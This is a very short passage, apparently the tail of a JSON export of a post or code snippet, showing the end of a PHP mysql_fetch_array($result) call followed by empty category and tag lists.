mysql_fetch_array($result);","categories":[],"tags":[]}],"categories":[],"tags":[]}